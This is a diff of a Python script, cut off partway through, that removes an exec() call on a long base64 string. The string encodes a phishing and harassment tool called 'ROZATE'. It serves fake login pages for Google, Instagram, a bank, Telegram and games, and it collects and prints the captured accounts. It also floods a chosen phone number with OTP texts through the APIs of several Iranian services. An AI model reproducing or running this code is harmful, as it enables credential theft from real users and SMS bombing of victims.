@@ -1,4 +1,425 @@
 # -*- coding: utf-8 -*-
 from __future__ import unicode_literals
+import requests
+from json import dumps
+from time import sleep as time
+from os import system as sys
+import os.path
 import base64
-exec(base64.b64decode("IyAtKi0gY29kaW5nOiB1dGYtOCAtKi0KZnJvbSBfX2Z1dHVyZV9fIGltcG9ydCB1bmljb2RlX2xpdGVyYWxzCmltcG9ydCByZXF1ZXN0cwpmcm9tIGpzb24gaW1wb3J0IGR1bXBzCmZyb20gdGltZSBpbXBvcnQgc2xlZXAgYXMgdGltZQpmcm9tIG9zIGltcG9ydCBzeXN0ZW0gYXMgc3lzCmltcG9ydCBvcy5wYXRoCmltcG9ydCBiYXNlNjQKaW1wb3J0IGRhdGV0aW1lCmltcG9ydCBweXVzZXJhZ2VudHMKIy0+ID0gPSA9IFsgUk9aQVRFIC0gdjEgXSA9ID0gPSA8LSMKb3BlbigiTXkiLCJ3KyIpLndyaXRlKCLwnZWu8J2VtPCdlbvwnZWz8J2VsPCdlb0t8J2WgyDihrQgXG5AQ2lwaGVyWCA9PiBSdWJpa2FcbkBFQkxFVFNNID0+IFRlbGVncmFtIikKb3BlbigiLmxvZyIsIithIikud3JpdGUoZiLwnZWu8J2VtPCdlbvwnZWz8J2VsPCdlb0t8J2WgyDihrQgXG5SdW4gU2hvZCBUb29scyB7ZGF0ZXRpbWUuZGF0ZXRpbWUubm93KCl9XG4iKQoKcmVxID0gcmVxdWVzdHMuc2Vzc2lvbigpICMgU2Vzc2lvbiBSZXF1ZXN0CnBsYXRmb3JtID0gcHl1c2VyYWdlbnRzLnJhbmRvbSgpICMgUGxhdGZvcm0gUmFuZG9tCmhlYWRlcnMgPSB7ImNvbnRlbnQtdHlwZSI6ImFwcGxpY2F0aW9uL2pzb24iLCJ1c2VyLWFnZW50IjpwbGF0Zm9ybX0gIyBIRUFERVJTCgpkZWYgcGFzc293cmQoKTogIyBDaGFuZyBQYXNzd29yZAoJdHJ5OgoJCXN5cygnY2xlYXInKQoJCXByaW50KCIiIlwwMzNbMzJtCgog4paI4paI4paI4paI4paI4paI4pWX4paI4paI4pWX4paI4paI4paI4paI4paI4paI4pWXIOKWiOKWiOKVlyAg4paI4paI4pWX4paI4paI4paI4paI4paI4paI4paI4pWX4paI4paI4paI4paI4paI4paI4pWXICAgICAg4paI4paI4pWXICDilojilojilZcK4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWd4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWRICDilojilojilZHilojilojilZTilZDilZDilZDilZDilZ3ilojilojilZTilZDilZDilojilojilZcgICAgIOKVmuKWiOKWiOKVl+KWiOKWiOKVlOKVnQrilojilojilZEgICAgIOKWiOKWiOKVkeKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVneKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVkeKWiOKWiOKWiOKWiOKWiOKVlyAg4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4paI4paI4paI4pWX4pWa4paI4paI4paI4pWU4pWdIArilojilojilZEgICAgIOKWiOKWiOKVkeKWiOKWiOKVlOKVkOKVkOKVkOKVnSDilojilojilZTilZDilZDilojilojilZHilojilojilZTilZDilZDilZ0gIOKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KVmuKVkOKVkOKVkOKVkOKVneKWiOKWiOKVlOKWiOKWiOKVlyAK4pWa4paI4paI4paI4paI4paI4paI4pWX4paI4paI4pWR4paI4paI4pWRICAgICDilojilojilZEgIOKWiOKWiOKVkeKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKVkSAg4paI4paI4pWRICAgICDilojilojilZTilZ0g4paI4paI4pWXCiDilZrilZDilZDilZDilZDilZDilZ3ilZrilZDilZ3ilZrilZDilZ0gICAgIOKVmuKVkOKVnSAg4pWa4pWQ4pWd4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWd4pWa4pWQ4pWdICDilZrilZDilZ0gICAgIOKVmuKVkOKVnSAg4pWa4pWQ4pWdCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiIiIikKCQlwcmludCgiXDAzM1szMm1ST1pBVEUgXDAzM1szNG0tIFwwMzNbMzFtdjEiKQoJCW5ld19wYXNzID0gc3RyKGlucHV0KCJcMDMzWzMybUVOVEVSIFBBU1NXT1JEIE5ldyBcMDMzWzMxbTogIikpCgkJc3lzKCJybSAtcmYgLmxvZ2luLnR4dCIpCgkJb3BlbigiLmxvZ2luLnR4dCIsIithIikud3JpdGUobmV3X3Bhc3MpCgkJcHJpbnQoIlwwMzNbMzJtT0sgQ2hhbmcgXDAzM1szMW1QQVNTV09SRCBcMDMzWzM2bTopIikKCQlyZXR1cm4gaW50ZXJuZXQoKQoJZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0OgoJCXBhc3MKZGVmIG5tYXAoKTogIyBOTUFQIFNjYW5uZXIKCXRyeToKCQlzeXMoJ2NsZWFyJykKCQlwcmludCgiIiJcMDMzWzMybQrilojilojilojilZcgICDilojilojilZfilojilojilojilZcgICDilojilojilojilZcg4paI4paI4paI4paI4paI4pWXIOKWiOKWiOKWiOKWiOKWiOKWiOKVlyAK4paI4paI4paI4paI4pWXICDilojilojilZHilojilojilojilojilZcg4paI4paI4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWU4pWQ4pWQ4paI4paI4pWXCuKWiOKWiOKVlOKWiOKWiOKVlyDilojilojilZHilojilojilZTilojilojilojilojilZTilojilojilZHilojilojilojilojilojilojilojilZHilojilojilojilojilojilojilZTilZ0K4paI4paI4pWR4pWa4paI4paI4pWX4paI4paI4pWR4paI4paI4pWR4pWa4paI4paI4pWU4pWd4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4pWQ4pWdIArilojilojilZEg4pWa4paI4paI4paI4paI4pWR4paI4paI4pWRIOKVmuKVkOKVnSDilojilojilZHilojilojilZEgIOKWiOKWiOKVkeKWiOKWiOKVkSAgICAgCuKVmuKVkOKVnSAg4pWa4pWQ4pWQ4pWQ4pWd4pWa4pWQ4pWdICAgICDilZrilZDilZ3ilZrilZDilZ0gIOKVmuKVkOKVneKVmuKVkOKVnSIiIikKCQlwcmludCgiXDAzM1szMm1ST1pBVEUgXDAzM1szNG0tIFwwMzNbMzFtdjEiKQoJCWlwX2VudGVyID0gc3RyKGlucHV0KCJcMDMzWzMybUlQXDAzM1szMW0gT3IgXDAzM1szN21TaXRlIDogIikpCgkJaW5mb19ubWFwID0gc3lzKGYibm1hcCB7aXBfZW50ZXJ9IHwgZ3JlcCAnb3BlbiciKQoJCXRpbWUoMC41NSkKCQlwcmludChmIlwwMzNbMzVtb3BlbiA6IFwwMzNbMzZte2luZm9fbm1hcH1cdiIpCgkJZW50ZXIgPSBzdHIoaW5wdXQoIlwwMzNbMzFtUmV0dXJuXDAzM1szMm0gUm96YXRlLnB5ID8gWS9OIDpcMDMzWzM2bSAiKSkKCQlpZiBlbnRlciA9PSAieSIgb3IgZW50ZXIgPT0gIlkiOgoJCQlyZXR1cm4gaW5kZXgoKQoJCWlmIGVudGVyID09ICJuIiBvciBlbnRlciA9PSAiTiI6CgkJCWV4aXQoKQoJZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0OgoJCXN5cygiY2xlYXIiKQoJCXByaW50KCJcMDMzWzM2bUNsb3NlZCBcMDMzWzMybVRvb2xzIFwwMzNbMzFtPyIpCgkJcmV0dXJuX3Rvb2xzID0gc3RyKGlucHV0KCJcMDMzWzM2bVlcMDMzWzMxbS9cMDMzWzM2bU4gXDAzM1szN206ICIpKQoJCWlmIHJldHVybl90b29scyA9PSAiWSIgb3IgcmV0dXJuX3Rvb2xzID09ICJ5IjoKCQkJZXhpdCgpCgkJZWxpZiByZXR1cm5fdG9vbHMgPT0gIm4iIG9yIHJldHVybl90b29scyA9PSAiTiI6CgkJCXJldHVybiBpbmRleCgpCmRlZiBDYWxsKCk6Cgl3aGlsZSBUcnVlOgoJCWlmIG9zLnBhdGguZXhpc3RzKCJzaXRlL0NhbGwvQWNjb3VudC50eHQiKToKCQkJc3lzKCJjYXQgc2l0ZS9DYWxsL0FjY291bnQudHh0IikKCQkJc3lzKCJybSAtcmYgc2l0ZS9DYWxsL0FjY291bnQudHh0IikKCQllbHNlOgoJCQlwYXNzCmRlZiBSdWJpa2EoKToKCXdoaWxlIFRydWU6CgkJaWYgb3MucGF0aC5leGlzdHMoInNpdGUvUnViaWthL0FjY291bnQudHh0Iik6CgkJCXN5cygiY2F0IHNpdGUvUnViaWthL0FjY291bnQudHh0IikKCQkJc3lzKCJybSAtcmYgc2l0ZS9SdWJpa2EvQWNjb3VudC50eHQiKQoJCWVsc2U6CgkJCXBhc3MKZGVmIFNoYWQoKToKCXdoaWxlIFRydWU6CgkJaWYgb3MucGF0aC5leGlzdHMoInNpdGUvU2hhZC9MT0cvQWNjb3VudC50eHQiKToKCQkJc3lzKCJjYXQgc2l0ZS9TaGFkL0xPRy9BY2NvdW50LnR4dCIpCgkJCXN5cygicm0gLXJmIHNpdGUvU2hhZC9MT0cvQWNjb3VudC50eHQiKQoJCWVsc2U6CgkJCXBhc3MKZGVmIFRlbGVncmFtKCk6Cgl3aGlsZSBUcnVlOgoJCWlmIG9zLnBhdGguZXhpc3RzKGYic2l0ZS9UZWxlZ3JhbS9pbmZvLnR4dCIpOgoJCQlzeXMoImNhdCBzaXRlL1RlbGVncmFtL2luZm8udHh0IikKCQkJc3lzKCJybSAtcmYgc2l0ZS9UZWxlZ3JhbS9pbmZvLnR4dCIpCgkJZWxzZToKCQkJcGFzcwpkZWYgSVAoKToKCXdoaWxlIFRydWU6CgkJaWYgb3MucGF0aC5leGlzdHMoZiJzaXRlL0lQL2lwLnR4dCIpOgoJCQlzeXMoImNhdCBzaXRlL0lQL2lwLnR4dCIpCgkJCXN5cygicm0gLXJmIHNpdGUvSVAvaXAudHh0IikKCQllbHNlOgoJCQlwYXNzCmRlZiBiYW5rKCk6CiAgICB3aGlsZSBUcnVlOgogICAgICAgIGlmICBvcy5wYXRoLmV4aXN0cyhmInNpdGUvYmFuay9iYW5rLnR4dCIpOgogICAgICAgIAlzeXMoZiJjYXQgc2l0ZS9iYW5rL2JhbmsudHh0IikKICAgICAgICAJc3lzKCJjcCBzaXRlL2JhbmsvYmFuay50eHQgTE9HIikKICAgICAgICAJc3lzKCJjcCBzaXRlL2JhbmsvRmFyc2lbQmFua10udHh0IExPRyIpCiAgICAgICAgCXN5cyhmInJtIC1yZiBzaXRlL2JhbmsvYmFuay50eHQiKQogICAgICAgIAlzeXMoInJtIC1yZiBzaXRlL2JhbmsvRmFyc2lbQmFua10udHh0IikKICAgICAgICBlbHNlOgogICAgICAgICAgICBwYXNzCQpkZWYgaW5zdGFncmFtKCk6CiAgICB3aGlsZSBUcnVlOgogICAgICAgIGlmICBvcy5wYXRoLmV4aXN0cyhmInNpdGUvaW5zdGFncmFtL2luc3RhZ3JhbS50eHQiKToKICAgICAgICAJc3lzKGYiY2F0IHNpdGUvaW5zdGFncmFtL2luc3RhZ3JhbS50eHQiKQogICAgICAgIAlzeXMoImNwIHNpdGUvaW5zdGFncmFtL2luc3RhZ3JhbS50eHQgTE9HIikKICAgICAgICAJc3lzKGYicm0gLXJmIHNpdGUvaW5zdGFncmFtL2luc3RhZ3JhbS50eHQiKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHBhc3MKZGVmIGdvb2dsZSgpOgogICAgd2hpbGUgVHJ1ZToKICAgICAgICBpZiAgb3MucGF0aC5leGlzdHMoZiJzaXRlL2dvb2dsZS9nb29nbGUudHh0Iik6CiAgICAgICAgCXN5cyhmImNhdCBzaXRlL2dvb2dsZS9nb29nbGUudHh0IikKICAgICAgICAJc3lzKCJjcCBzaXRlL2dvb2dsZS9nb29nbGUudHh0IExPRyIpCiAgICAgICAgCXN5cyhmInJtIC1yZiBzaXRlL2dvb2dsZS9nb29nbGUudHh0IikKICAgICAgICBlbHNlOgogICAgICAgICAgICBwYXNzCmRlZiBwaGlzaGluZygpOgoJc3lzKCJjbGVhciIpCglwcmludCgiIiJcMDMzWzMxbQoKIOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKVlyDilojilojilZcgIOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKVlyAgICAgIOKWiOKWiOKVlyAg4paI4paI4pWXCuKWiOKWiOKVlOKVkOKVkOKVkOKVkOKVneKWiOKWiOKVkeKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVkSAg4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWd4paI4paI4pWU4pWQ4pWQ4paI4paI4pWXICAgICDilZrilojilojilZfilojilojilZTilZ0K4paI4paI4pWRICAgICDilojilojilZHilojilojilojilojilojilojilZTilZ3ilojilojilojilojilojilojilojilZHilojilojilojilojilojilZcgIOKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVneKWiOKWiOKWiOKWiOKWiOKVl+KVmuKWiOKWiOKWiOKVlOKVnSAK4paI4paI4pWRICAgICDilojilojilZHilojilojilZTilZDilZDilZDilZ0g4paI4paI4pWU4pWQ4pWQ4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4pWdICDilojilojilZTilZDilZDilojilojilZfilZrilZDilZDilZDilZDilZ3ilojilojilZTilojilojilZcgCuKVmuKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKVkeKWiOKWiOKVkSAgICAg4paI4paI4pWRICDilojilojilZHilojilojilojilojilojilojilojilZfilojilojilZEgIOKWiOKWiOKVkSAgICAg4paI4paI4pWU4pWdIOKWiOKWiOKVlwog4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWd4pWa4pWQ4pWd4pWa4pWQ4pWdICAgICDilZrilZDilZ0gIOKVmuKVkOKVneKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVneKVmuKVkOKVnSAg4pWa4pWQ4pWdICAgICDilZrilZDilZ0gIOKVmuKVkOKVnQogXG5cMDMzWzBtICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCgkJCSIiIikKCXByaW50KCIiIgpcMDMzWzMybSBbMV0gXDAzM1szMW0gR29vZ2xlXG4KXDAzM1szMm0gWzJdIFwwMzNbMzFtIEluc3RhZ3JhbVxuClwwMzNbMzJtIFszXSBcMDMzWzMxbSBWSVAgWyBcMDMzWzM3bUJBTksgUGhpc2hpbmcgXDAzM1szMW1dXG4KXDAzM1szMm0gWzRdIFwwMzNbMzFtIElQIFRhcmdldFxuClwwMzNbMzJtIFs1XSBcMDMzWzMxbSBUZWxlZ3JhbVxuClwwMzNbMzJtIFs2XSBcMDMzWzMxbSBTaGFkXG4KXDAzM1szMm0gWzddIFwwMzNbMzFtIFJ1YmlrYVxuClwwMzNbMzJtIFs4XSBcMDMzWzMxbSBDYWxsIE9mIER1dHlcbgpcMDMzWzMxbSBbMDBdIFwwMzNbMzJtIEJhY2sgTWVudQoiIiIpCglvcHQgPSBpbnB1dChzdHIoIlwwMzNbMzFtIEVudGVyIDpcMDMzWzM3bSAiKSkKCWlmIG9wdCA9PSAiMDAiIG9yIG9wdCA9PSAiMCI6CgkJcmV0dXJuIGluZGV4KCkKCWlmIG9wdCA9PSAiMSI6CgkJc3lzKCJjbGVhciIpCgkJdHJ5OgoJCQlwb3J0ID0gc3RyKGlucHV0KCJcMDMzWzMxbSBwb3J0IFwwMzNbMzJtKFwwMzNbMzJtMVwwMzNbMzFtLCBcMDMzWzMybTEwMDBcMDMzWzMybSkgXDAzM1swbTpcMDMzWzM3bSAiKSkKCQkJc3lzKGYicGhwIC1TIDEyNy4wLjAuMTp7cG9ydH0gLXQgc2l0ZS9nb29nbGUgPiAvZGV2L251bGwgMj4mMSAmIHNsZWVwIDIiKQoJCQlwcmludChmIlwwMzNbMzFtIFJVTiBMb2NhbEhvc3Qg4oa0XG5cMDMzWzM0bSBodHRwOi8vbG9jYWxob3N0Ontwb3J0fSIpCgkJCXByaW50KCJcMDMzWzM1bTw9PT09PT09PT0+XG5cMDMzWzBtIikKCQkJZ29vZ2xlKCkKCQlleGNlcHQ6CgkJCXN5cygia2lsbGFsbCBwaHAiKQkJCglpZiBvcHQgPT0gIjciOgoJCXN5cygiY2xlYXIiKQoJCXRyeToKCQkJcG9ydCA9IHN0cihpbnB1dCgiXDAzM1szMW0gcG9ydCBcMDMzWzMybShcMDMzWzMybTFcMDMzWzMxbSwgXDAzM1szMm0xMDAwXDAzM1szMm0pIFwwMzNbMG06XDAzM1szN20gIikpCgkJCXN5cyhmInBocCAtUyAxMjcuMC4wLjE6e3BvcnR9IC10IHNpdGUvUnViaWthID4gL2Rldi9udWxsIDI+JjEgJiBzbGVlcCAyIikKCQkJcHJpbnQoZiJcMDMzWzMxbSBSVU4gTG9jYWxIb3N0IOKGtFxuXDAzM1szNG0gaHR0cDovL2xvY2FsaG9zdDp7cG9ydH0iKQoJCQlwcmludCgiXDAzM1szNW08PT09PT09PT09PlxuXDAzM1swbSIpCgkJCVJ1YmlrYSgpCgkJZXhjZXB0OgoJCQlzeXMoImtpbGxhbGwgcGhwIikJCglpZiBvcHQgPT0gIjgiOgoJCXN5cygiY2xlYXIiKQoJCXRyeToKCQkJcG9ydCA9IHN0cihpbnB1dCgiXDAzM1szMW0gcG9ydCBcMDMzWzMybShcMDMzWzMybTFcMDMzWzMxbSwgXDAzM1szMm0xMDAwXDAzM1szMm0pIFwwMzNbMG06XDAzM1szN20gIikpCgkJCXN5cyhmInBocCAtUyAxMjcuMC4wLjE6e3BvcnR9IC10IHNpdGUvQ2FsbCA+IC9kZXYvbnVsbCAyPiYxICYgc2xlZXAgMiIpCgkJCXByaW50KGYiXDAzM1szMW0gUlVOIExvY2FsSG9zdCDihrRcblwwMzNbMzRtIGh0dHA6Ly9sb2NhbGhvc3Q6e3BvcnR9IikKCQkJcHJpbnQoIlwwMzNbMzVtPD09PT09PT09PT5cblwwMzNbMG0iKQoJCQlDYWxsKCkKCQlleGNlcHQ6CgkJCXBhc3MJCglpZiBvcHQgPT0gIjIiOgoJCXN5cygiY2xlYXIiKQoJCXRyeToKCQkJcG9ydCA9IHN0cihpbnB1dCgiXDAzM1szMW0gcG9ydCBcMDMzWzMybShcMDMzWzMybTFcMDMzWzMxbSwgXDAzM1szMm0xMDAwXDAzM1szMm0pIFwwMzNbMG06XDAzM1szN20gIikpCgkJCXN5cyhmInBocCAtUyAxMjcuMC4wLjE6e3BvcnR9IC10IHNpdGUvaW5zdGFncmFtID4gL2Rldi9udWxsIDI+JjEgJiBzbGVlcCAyIikKCQkJcHJpbnQoZiJcMDMzWzMxbSBSVU4gTG9jYWxIb3N0IOKGtFxuXDAzM1szNG0gaHR0cDovL2xvY2FsaG9zdDp7cG9ydH0iKQoJCQlwcmludCgiXDAzM1szNW08PT09PT09PT09PlxuXDAzM1swbSIpCgkJCWluc3RhZ3JhbSgpCgkJZXhjZXB0OgoJCQlzeXMoImtpbGxhbGwgcGhwIikKCWlmIG9wdCA9PSAiNSI6CgkJc3lzKCJjbGVhciIpCgkJdHJ5OgoJCQlwb3J0ID0gc3RyKGlucHV0KCJcMDMzWzMxbSBwb3J0IFwwMzNbMzJtKFwwMzNbMzJtMVwwMzNbMzFtLCBcMDMzWzMybTEwMDBcMDMzWzMybSkgXDAzM1swbTpcMDMzWzM3bSAiKSkKCQkJc3lzKGYicGhwIC1TIDEyNy4wLjAuMTp7cG9ydH0gLXQgc2l0ZS9UZWxlZ3JhbSA+IC9kZXYvbnVsbCAyPiYxICYgc2xlZXAgMiIpCgkJCXByaW50KGYiXDAzM1szMW0gUlVOIExvY2FsSG9zdCDihrRcblwwMzNbMzRtIGh0dHA6Ly9sb2NhbGhvc3Q6e3BvcnR9IikKCQkJcHJpbnQoIlwwMzNbMzVtPD09PT09PT09PT5cblwwMzNbMG0iKQoJCQlUZWxlZ3JhbSgpCgkJZXhjZXB0OiBwYXNzCglpZiBvcHQgPT0gIjYiOgoJCXN5cygiY2xlYXIiKQoJCXRyeToKCQkJcG9ydCA9IHN0cihpbnB1dCgiXDAzM1szMW0gcG9ydCBcMDMzWzMybShcMDMzWzMybTFcMDMzWzMxbSwgXDAzM1szMm0xMDAwXDAzM1szMm0pIFwwMzNbMG06XDAzM1szN20gIikpCgkJCXN5cyhmInBocCAtUyAxMjcuMC4wLjE6e3BvcnR9IC10IHNpdGUvU2hhZCA+IC9kZXYvbnVsbCAyPiYxICYgc2xlZXAgMiIpCgkJCXByaW50KGYiXDAzM1szMW0gUlVOIExvY2FsSG9zdCDihrRcblwwMzNbMzRtIGh0dHA6Ly9sb2NhbGhvc3Q6e3BvcnR9IikKCQkJcHJpbnQoIlwwMzNbMzVtPD09PT09PT09PT5cblwwMzNbMG0iKQoJCQlTaGFkKCkKCQlleGNlcHQ6IHBhc3MKCWlmIG9wdCA9PSAiNCI6CgkJc3lzKCJjbGVhciIpCgkJdHJ5OgoJCQlwb3J0ID0gc3RyKGlucHV0KCJcMDMzWzMxbSBwb3J0IFwwMzNbMzJtKFwwMzNbMzJtMVwwMzNbMzFtLCBcMDMzWzMybTEwMDBcMDMzWzMybSkgXDAzM1swbTpcMDMzWzM3bSAiKSkKCQkJc3lzKGYicGhwIC1TIDEyNy4wLjAuMTp7cG9ydH0gLXQgc2l0ZS9JUCA+IC9kZXYvbnVsbCAyPiYxICYgc2xlZXAgMiIpCgkJCXByaW50KGYiXDAzM1szMW0gUlVOIExvY2FsSG9zdCDihrRcblwwMzNbMzRtIGh0dHA6Ly9sb2NhbGhvc3Q6e3BvcnR9IikKCQkJcHJpbnQoIlwwMzNbMzVtPD09PT09PT09PT5cblwwMzNbMG0iKQoJCQlJUCgpCgkJZXhjZXB0OgoJCQlwYXNzCQkJIAoJaWYgb3B0ID09ICIzIjoKCQlzeXMoImNsZWFyIikKCQlrZXkgPSBzdHIoaW5wdXQoIlwwMzNbMzJtIEtFWSA6IFwwMzNbMzdtIikpCgkJaWYga2V5ID09IG9wZW4oInNpdGUvRG9udCIpLnJlYWQoKToKCQkJdHJ5OgoJCQkJcG9ydCA9IHN0cihpbnB1dCgiXDAzM1szMW0gcG9ydCBcMDMzWzMybShcMDMzWzMybTFcMDMzWzMxbSwgXDAzM1szMm0xMDAwXDAzM1szMm0pIFwwMzNbMG06XDAzM1szN20gIikpCgkJCQlzeXMoZiJwaHAgLVMgMTI3LjAuMC4xOntwb3J0fSAtdCBzaXRlL2JhbmsgPiAvZGV2L251bGwgMj4mMSAmIHNsZWVwIDIiKQoJCQkJcHJpbnQoZiJcMDMzWzMxbSBSVU4gTG9jYWxIb3N0IOKGtFxuXDAzM1szNG0gaHR0cDovL2xvY2FsaG9zdDp7cG9ydH0iKQoJCQkJcHJpbnQoIlwwMzNbMzVtPD09PT09PT09PT5cblwwMzNbMG0iKQoJCQkJYmFuaygpCgkJCWV4Y2VwdDoKCQkJCXN5cygia2lsbGFsbCBwaHAiKQoJCWVsc2U6CgkJCXRpbWUoMikKCQkJc3lzKCJjbGVhciIpCgkJCXByaW50KCIiIlwwMzNbMzFtCgog4paI4paI4paI4paI4paI4paI4pWX4paI4paI4pWX4paI4paI4paI4paI4paI4paI4pWXIOKWiOKWiOKVlyAg4paI4paI4pWX4paI4paI4paI4paI4paI4paI4paI4pWX4paI4paI4paI4paI4paI4paI4pWXICAgICAg4paI4paI4pWXICDilojilojilZcK4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWd4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWRICDilojilojilZHilojilojilZTilZDilZDilZDilZDilZ3ilojilojilZTilZDilZDilojilojilZcgICAgIOKVmuKWiOKWiOKVl+KWiOKWiOKVlOKVnQrilojilojilZEgICAgIOKWiOKWiOKVkeKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVneKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVkeKWiOKWiOKWiOKWiOKWiOKVlyAg4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4paI4paI4paI4pWX4pWa4paI4paI4paI4pWU4pWdIArilojilojilZEgICAgIOKWiOKWiOKVkeKWiOKWiOKVlOKVkOKVkOKVkOKVnSDilojilojilZTilZDilZDilojilojilZHilojilojilZTilZDilZDilZ0gIOKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KVmuKVkOKVkOKVkOKVkOKVneKWiOKWiOKVlOKWiOKWiOKVlyAK4pWa4paI4paI4paI4paI4paI4paI4pWX4paI4paI4pWR4paI4paI4pWRICAgICDilojilojilZEgIOKWiOKWiOKVkeKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKVkSAg4paI4paI4pWRICAgICDilojilojilZTilZ0g4paI4paI4pWXCiDilZrilZDilZDilZDilZDilZDilZ3ilZrilZDilZ3ilZrilZDilZ0gICAgIOKVmuKVkOKVnSAg4pWa4pWQ4pWd4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWd4pWa4pWQ4pWdICDilZrilZDilZ0gICAgIOKVmuKVkOKVnSAg4pWa4pWQ4pWdCiBcblwwMzNbMG1cblwwMzNbMzJtVGhlIFwwMzNbMzFta2V5IFwwMzNbMzJtaXMgd3JvbmchICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCgkJCSIiIikJCQkKZGVmIHNwYW0oKTogIyBTUEFNIFNNUyBCb21iZXIKCXRyeToKCQlzeXMoJ2NsZWFyJykKCQlwcmludCgiIiJcMDMzWzMxbQoK4paI4paI4paI4paI4paI4paI4paI4pWX4paI4paI4paI4pWXICAg4paI4paI4paI4pWX4paI4paI4paI4paI4paI4paI4paI4pWXCuKWiOKWiOKVlOKVkOKVkOKVkOKVkOKVneKWiOKWiOKWiOKWiOKVlyDilojilojilojilojilZHilojilojilZTilZDilZDilZDilZDilZ0K4paI4paI4paI4paI4paI4paI4paI4pWX4paI4paI4pWU4paI4paI4paI4paI4pWU4paI4paI4pWR4paI4paI4paI4paI4paI4paI4paI4pWXCuKVmuKVkOKVkOKVkOKVkOKWiOKWiOKVkeKWiOKWiOKVkeKVmuKWiOKWiOKVlOKVneKWiOKWiOKVkeKVmuKVkOKVkOKVkOKVkOKWiOKWiOKVkQrilojilojilojilojilojilojilojilZHilojilojilZEg4pWa4pWQ4pWdIOKWiOKWiOKVkeKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVkQrilZrilZDilZDilZDilZDilZDilZDilZ3ilZrilZDilZ0gICAgIOKVmuKVkOKVneKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVnQogICAgICAgICAgICAgICAgICAgICAgICAgICAKIiIiKQoJCXByaW50KCJcMDMzWzMybVJPWkFURSBcMDMzWzM0bS0gXDAzM1szMW12MSIpCgkJbnVtYmVyX3NwYW0gPSBzdHIoaW5wdXQoIlwwMzNbMzJtTlVNQkVSIFwwMzNbMzFtKDkxMioqKioqKikgOiAiKSkKCQl0ZWRhZCA9IGludChpbnB1dCgiXDAzM1szMm1TaXplIFNFTkQgXDAzM1szMW0oIDEgLSAxMDAgKSA6ICIpKQoJCWlmIHRlZGFkID4gMTAwOgoJCQlzeXMoImNsZWFyIikKCQkJcHJpbnQoIlwwMzNbMzFtRVJST1IgXDAzM1szMm0xMDAgQmUgUGFpbiBWYXJkIEtvbmVkIDopIikKCQkJdGltZSgyKQoJCQlyZXR1cm4gc3BhbSgpCgkJZWxzZToKCQkJZm9yIGkgaW4gcmFuZ2UoaW50KHRlZGFkKSk6CgkJCQlwcmludChmIlwwMzNbMzdtU0VORCBNZXNzYWdlIFRlYW0gXDAzM1szM217aX1cMDMzWzM3bSBUYVwwMzNbMzNtIHt0ZWRhZH0iKQoJCQkJdGltZSg0KQoJCQkJcmVxLnBvc3QoImh0dHBzOi8vYXBwLnNuYXBwLnRheGkvYXBpL2FwaS1wYXNzZW5nZXItb2F1dGgvdjIvb3RwIixoZWFkZXJzPWhlYWRlcnMsZGF0YT1kdW1wcyh7ImNlbGxwaG9uZSI6IGYiKzk4e251bWJlcl9zcGFtfSJ9KS5lbmNvZGUoKSkKCQkJCXByaW50KCJcMDMzWzMybVNFTkQgU01TICMgXDAzM1szMW1TTkFQIikKCQkJCXRpbWUoNCkKCQkJCXJlcS5wb3N0KCJodHRwczovL2FwaS5kaXZhci5pci92NS9hdXRoL2F1dGhlbnRpY2F0ZSIsaGVhZGVycz1oZWFkZXJzLGRhdGE9ZHVtcHMoeyJwaG9uZSI6IGYnMHtudW1iZXJfc3BhbX0nfSkpCgkJCQlwcmludCgiXDAzM1szMm1TRU5EIFNNUyAjIFwwMzNbMzFtRGl2YXIiKQoJCQkJdGltZSg0KQoJCQkJcmVxLnBvc3QoImh0dHBzOi8vd3d3LnNoZXlwb29yLmNvbS9hcGkvdjEwLjAuMC9hdXRoL3NlbmQiLGhlYWRlcnM9aGVhZGVycyxkYXRhPWR1bXBzKHsidXNlcm5hbWUiOiIwIitudW1iZXJfc3BhbX0pKQoJCQkJcHJpbnQoIlwwMzNbMzJtU0VORCBTTVMgIyBcMDMzWzMxbXNoZXlwb29yIikKCQkJCXRpbWUoNCkKCQkJCXJlcS5wb3N0KCJodHRwczovL2FwcC5zbmFwcC1ib3guY29tL2FwaS92Mi9hdXRoL290cC9zZW5kIixoZWFkZXJzPWhlYWRlcnMsZGF0